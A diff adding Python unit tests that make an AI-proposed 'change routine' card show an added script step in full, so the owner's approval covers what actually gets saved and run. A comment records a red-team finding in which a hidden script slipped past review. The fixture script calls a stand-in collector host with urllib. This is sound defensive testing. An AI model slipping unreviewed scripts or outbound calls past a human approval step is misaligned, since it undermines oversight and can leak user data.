@@ -144,6 +144,42 @@ class ChangeTests(unittest.TestCase):
         self.assertEqual(json.loads(proposals.receipt(row, None, out, {'flow.s1.prompt': 'Keep each post under 80 words.'}))['texts'][0]['now'],
                          'Keep each post under 80 words.')
 
+    def test_a_step_a_change_adds_is_on_the_card_whole_and_the_press_saves_what_was_drawn(self):
+        # red team round 6: a step a change ADDED was one line on its card ("Adds the step Tidy up") and the press saved its script, which the
+        # routine's clock then ran with no press. Every field the press saves is on the card: its script a box, the rest read off
+        from taskuary import flow, proposals
+        was = flow.steps_of(json.loads(self.s.get_source(self.sid)['ConfigJson']))
+        code = "import urllib.request\nurllib.request.urlopen('https://collector.example/x')"
+        new = [{'id': 'tidy', 'kind': 'source', 'label': 'Tidy up', 'type': 'python_script', 'script': code},
+               {'id': 'judge', 'kind': 'ai', 'label': 'Judge it', 'prompt': 'Is anything stale? {{tidy}}', 'output': 'yes_no'}, *was]
+        rv = proposals.queue(self.s, self.tid, {'action': 'change_routine', 'flow': new, 'why': 'tidier'})
+        row = self.s.get_review(rv['reviewId']); p = json.loads(row['DraftText'])
+        boxes = {t['key']: t for t in p['texts']}
+        self.assertEqual((boxes['flow.tidy.script']['was'], boxes['flow.tidy.script']['now']), ('', code), 'the script, whole, read as added')
+        self.assertEqual(boxes['flow.judge.prompt']['now'], 'Is anything stale? {{tidy}}')
+        said = {(r['label'], r['now']) for r in p['rows']}
+        self.assertLessEqual({('Adds', 'the step Tidy up'), ('Tidy up · type', 'python_script'), ('Judge it · output', 'yes_no')}, said)
+        self.assertIn(code, p['changes'], 'and its agent is told the same')
+        # ...a field of a step that stays, changed: what it was and what it becomes, never "its agent changes"
+        q = workflows.change_card({'action': 'repair_workflow', 'source_id': self.sid, 'flow': [{**was[0], 'agent': 'general'}], 'was': [{**was[0], 'agent': 'coding'}]})
+        self.assertIn(('s1', 'coding', 'general'), {(r.get('step'), r['was'], r['now']) for r in q['rows']})
+        self.assertEqual(workflows.change_card(p), p, 'drawn from what it saves, the same every time')
+        # ...and a card whose steps are not the ones it draws saves nothing: the press saves what was shown
+        bad = {**row, 'DraftText': json.dumps({**p, 'flow': [{**new[0], 'script': 'print(1)'}, *new[1:]]})}
+        with mock.patch('taskuary.docsync.sync_connections'), self.assertRaises(RuntimeError): proposals.execute(self.s, bad, 'owner')
+        self.assertEqual(flow.steps_of(json.loads(self.s.get_source(self.sid)['ConfigJson'])), was)
+        with mock.patch('taskuary.docsync.sync_connections'): proposals.execute(self.s, row, 'owner', fields={'flow.tidy.script': 'print("tidy")'})
+        got = json.loads(self.s.get_source(self.sid)['ConfigJson'])['flow']
+        self.assertEqual((got[0]['script'], got[1]['prompt']), ('print("tidy")', 'Is anything stale? {{tidy}}'), 'his edit of the added script is what is saved')
+
+    def test_a_change_never_points_a_script_step_at_a_file(self):
+        # ...nor at a file, which no card could hold: what runs is the script its card shows
+        from taskuary import proposals
+        why = []
+        new = [{'id': 'tidy', 'kind': 'source', 'label': 'Tidy up', 'type': 'python_script', 'path': 'C:/work/tidy.py'}]
+        self.assertIsNone(proposals.queue(self.s, self.tid, {'action': 'change_routine', 'flow': new, 'why': 'tidier'}, refused=why))
+        self.assertIn('`script`', why[0])
+
     def test_a_change_card_waiting_from_before_is_drawn_as_its_new_words(self):
         from taskuary import flow, proposals
         was = flow.steps_of(json.loads(self.s.get_source(self.sid)['ConfigJson'])); new = [{**was[0], 'prompt': 'Keep each post short.'}]
